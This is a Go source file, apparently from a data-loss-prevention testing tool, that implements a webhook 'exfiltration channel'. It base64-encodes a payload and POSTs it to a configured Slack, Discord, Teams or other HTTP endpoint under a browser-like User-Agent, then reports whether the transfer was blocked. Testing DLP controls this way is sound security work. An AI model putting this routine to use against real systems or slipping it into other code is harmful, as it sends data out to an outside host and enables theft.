// Package webhook implements a SaaS webhook exfiltration channel.
// Sends the base64-encoded payload as a JSON POST to a configured webhook URL
// (Slack, Discord, Teams, or any HTTP endpoint).
package webhook

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/hssn-research/dlpbuster/internal/channels"
)

// Channel implements channels.Channel for webhook exfiltration.
type Channel struct{}

// New returns a new Webhook Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "webhook" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Exfiltrate payload via HTTPS POST to a Slack/Discord/Teams webhook URL"
}

// webhookPayload is the JSON body sent to the webhook.
type webhookPayload struct {
	Text    string `json:"text"`
	Payload string `json:"payload"`
}

// Run posts the payload to the configured webhook URL.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	if cfg.WebhookURL == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"webhook: no URL configured"}
		result.Duration = time.Since(start)
		return result
	}

	encoded := base64.StdEncoding.EncodeToString(cfg.Payload)
	body := webhookPayload{
		Text:    "[DLP Test] Authorized exfil simulation",
		Payload: encoded,
	}
	bodyBytes, err := json.Marshal(body)
	if err != nil {
		result.Status = channels.StatusError
		result.Error = fmt.Errorf("webhook: marshal payload: %w", err)
		result.Duration = time.Since(start)
		return result
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, cfg.WebhookURL, bytes.NewReader(bodyBytes))
	if err != nil {
		result.Status = channels.StatusError
		result.Error = fmt.Errorf("webhook: build request: %w", err)
		result.Duration = time.Since(start)
		return result
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		result.Status = channels.StatusBlocked
		result.Evidence = []string{fmt.Sprintf("webhook: POST failed: %v", err)}
		result.Duration = time.Since(start)
		return result
	}
	defer resp.Body.Close()

	evidence := []string{fmt.Sprintf("POST %s → %d %s", cfg.WebhookURL, resp.StatusCode, http.StatusText(resp.StatusCode))}

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		result.Status = channels.StatusPassed
		result.BytesSent = len(bodyBytes)
	} else {
		result.Status = channels.StatusBlocked
	}
	result.Evidence = evidence
	result.Duration = time.Since(start)
	return result
}
